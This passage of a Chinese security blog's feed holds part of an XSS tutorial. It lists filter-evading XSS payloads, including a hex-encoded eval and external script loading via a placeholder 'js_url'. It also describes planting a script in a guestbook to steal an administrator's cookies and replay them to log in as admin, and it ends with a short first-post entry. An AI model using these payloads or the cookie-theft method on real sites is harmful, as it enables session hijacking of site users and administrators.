&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;scr&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;onerror&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;alert(&lt;/span&gt;&#39;&lt;span class=&quot;attr&quot;&gt;xss&lt;/span&gt;&#39;)&amp;gt;&lt;/span&gt; 当找不到图片名为1的文件时，执行alert(&#39;xss&#39;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;javascrip:alert(&lt;/span&gt;&#39;&lt;span class=&quot;attr&quot;&gt;xss&lt;/span&gt;&#39;)&amp;gt;&lt;/span&gt;s&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt; 点击s时运行alert(&#39;xss&#39;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;iframe&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;javascript:alert(&lt;/span&gt;&#39;&lt;span class=&quot;attr&quot;&gt;xss&lt;/span&gt;&#39;);&lt;span class=&quot;attr&quot;&gt;height&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;width&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;iframe&lt;/span&gt;&amp;gt;&lt;/span&gt; 利用iframe的scr来弹窗&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;onerror&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;eval(&lt;/span&gt;&quot;\&lt;span class=&quot;attr&quot;&gt;x61&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x6c&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x65&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x72&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x74&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x28&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x27&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x78&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x73&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x73&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x27&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x29&lt;/span&gt;&quot;)&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt;&amp;gt;&lt;/span&gt; 过滤了alert来执行弹窗&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;等等有很多的方法，不要把思想总局限于一种上面，记住一句话“xss就是在页面执行你想要的js”其他的管他去。(当然有的时候还要管他…)&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0×05-xss的利用&quot;&gt;&lt;a href=&quot;#0×05-xss的利用&quot; class=&quot;headerlink&quot; title=&quot;0×05 xss的利用:&quot;&gt;&lt;/a&gt;0×05 xss的利用:&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;说了那么多，大家可能都以为xss就是弹窗，其实错了，弹窗只是测试xss的存在性和使用性。&lt;/p&gt;
&lt;p&gt;这时我们要插入js代码了，怎么插呢？&lt;/p&gt;
&lt;p&gt;你可以这样&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;scr&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;js_url&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也可以这样&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;onerror&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;appendChild(createElement(&lt;/span&gt;&#39;&lt;span class=&quot;attr&quot;&gt;script&lt;/span&gt;&#39;))&lt;span class=&quot;attr&quot;&gt;.src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&#39;js_url&#39;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;各种姿势，各种插，只要鞥运行我们的js就OK。那运行我们的js有什么用呢？&lt;/p&gt;
&lt;p&gt;Js可以干很多的事，可以获取cookies(对http-only没用)、控制用户的动作(发帖、私信什么的)等等。&lt;/p&gt;
&lt;p&gt;比如我们在网站的留言区输入&lt;code&gt;&amp;lt;script scr=&amp;quot;js_url&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;当管理员进后台浏览留言的时候，就会触发，然后管理员的cookies和后台地址还有管理员浏览器版本等等你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。&lt;/p&gt;
&lt;p&gt;至于不会js的怎么写js代码呢，放心网上有很多xss平台，百度一下就可以看到了。页面是傻瓜式的操作，这里就不再过多的说明了。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;作者信息：&quot;&gt;&lt;a href=&quot;#作者信息：&quot; class=&quot;headerlink&quot; title=&quot;作者信息：&quot;&gt;&lt;/a&gt;&lt;code&gt;作者信息：&lt;/code&gt;&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;Author:Black-Hole&lt;/p&gt;
&lt;p&gt;Blog:&lt;a href=&quot;http://bugs.cc/&quot;&gt;http://bugs.cc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;github:&lt;a href=&quot;https://github.com/BlackHole1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/BlackHole1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Twitter:&lt;a href=&quot;https://twitter.com/Free_BlackHole&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://twitter.com/Free_BlackHole&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Email:158blackhole@gmail.com&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;h3 id=&quot;0×01-前言&quot;&gt;&lt;a href=&quot;#0×01-前言&quot; class=&quot;headerlink&quot; title=&quot;0×01 前言:&quot;&gt;&lt;/a&gt;0×01 前言:&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。&lt;/p&gt;
&lt;p&gt;我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;耗时间&lt;/li&gt;
&lt;li&gt;有一定几率不成功&lt;/li&gt;
&lt;li&gt;没有相应的软件来完成自动化攻击&lt;/li&gt;
&lt;li&gt;前期需要基本的html、js功底，后期需要扎实的html、js、actionscript2/3.0等语言的功底&lt;/li&gt;
&lt;li&gt;是一种被动的攻击手法&lt;/li&gt;
&lt;li&gt;对website有http-only、crossdomian.xml没有用&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>第一篇博文</title>
    <link href="http://bugs.cc/2016/05/28/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E6%96%87/"/>
    <id>http://bugs.cc/2016/05/28/第一篇博文/</id>
    <published>2016-05-28T06:35:25.000Z</published>
    <updated>2016-08-23T16:11:51.737Z</updated>
    
    <content type="html">&lt;p&gt;我从事互联网有六个年头了，这个算是我第一个Blog吧，之前一直以“没时间”的借口来安慰自己。现在想好好的总结这六年来的点点滴滴了。也为了以后可以更好的发布自己的见解、文章、工具等。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;作者信息：&quot;&gt;&lt;a href=&quot;#作者信息：&quot; class=&quot;headerlink&quot; title=&quot;作者信息：&quot;&gt;&lt;/a&gt;&lt;code&gt;作者信息：&lt;/code&gt;&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;Author:Black-Hole&lt;/p&gt;
&lt;p&gt;Blog:&lt;a href=&quot;http://bugs.cc/&quot;&gt;http://bugs.cc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;github:&lt;a href=&quot;https://github.com/BlackHole1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/BlackHole1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Twitter:&lt;a href=&quot;https://twitter.com/Free_BlackHole&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://twitter.com/Free_BlackHole&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Email:158blackhole@gmail.com&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;我从事互联网有六个年头了，这个算是我第一个Blog吧，之前一直以“没时间”的借口来安慰自己。现在想好好的总结这六年来的点点滴滴了。也为了以后可以更好的发布自己的见解、文章、工具等。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;作者信息：&quot;&gt;&lt;a href=&quot;#作者信息：&quot; class
    
    </summary>
    
    
      <category term="随笔" scheme="http://bugs.cc/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
